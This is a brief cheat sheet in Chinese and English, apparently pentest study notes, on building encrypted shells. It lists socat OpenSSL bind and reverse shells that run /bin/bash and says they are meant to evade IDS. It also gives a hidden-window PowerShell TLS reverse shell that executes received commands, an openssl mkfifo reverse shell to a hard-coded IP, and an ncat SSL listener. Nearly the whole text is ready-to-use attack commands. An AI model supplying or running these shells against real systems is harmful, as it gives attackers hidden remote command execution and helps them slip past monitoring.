# 加密shell encrypted shell

```
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt

cat shell.key shell.crt > shell.pem

sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash
socat - OPENSSL:10.11.0.4:443,verify=0

这样可以连一个bindshell用openssl加密绕过IDS


加密反弹shell
监听
sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork STDOUT
反弹 
socat - OPENSSL:127.0.0.1:443,verify=0 EXEC:/bin/bash


windows powershell 原生支持加密反弹

powershell -nop -noni -w Hidden -ep Bypass -e 

$c=New-Object Net.Sockets.TcpClient("192.168.100.128",1337)
$s=$c.GetStream()
$ss=New-Object Net.Security.SslStream($s,$False,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$ss.AuthenticateAsClient("foo.tld",$Null,"Tls12",$False)
$w=New-Object IO.StreamWriter($ss)
$w.Write("PS "+(pwd).Path+"> ")
$w.Flush()
[byte[]]$b=0..65535|%{0}
while(($i=$ss.Read($b,0,$b.Length)) -ne 0){
    $d=(New-Object -TypeName Text.UTF8Encoding).GetString($b,0,$i)
    $sb=(iex $d | Out-String) 2>&1
    $sb2=$sb+"PS "+(pwd).Path+"> "
    $sb=([Text.Encoding]::UTF8).GetBytes($sb2)
    $ss.Write($sb,0,$sb.Length)
    $ss.Flush()
}
$c.Close()


----------openssl reverse shell-----------

rm /tmp/s;mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.17.114:1337 > /tmp/s; rm /tmp/s

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

openssl s_server -quiet -key key.pem -cert cert.pem -port 7002

----------ncat ssl ----------------------
ncat --ssl -nvlp 443
```

To do so, we combine both the bind_shell.key and bind_shell.crt files into a single .pem file before we create the encrypted socat listener.

